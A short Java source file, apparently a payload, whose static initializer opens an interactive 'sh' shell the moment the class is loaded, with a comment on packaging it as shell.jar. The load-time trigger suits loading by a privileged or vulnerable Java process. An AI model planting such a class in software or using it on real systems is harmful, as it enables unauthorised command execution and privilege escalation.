// javac Shell.java && jar --create --file shell.jar Shell.class
public class Shell {
    static {
        try {
            new java.lang.ProcessBuilder("sh").inheritIO().start().waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
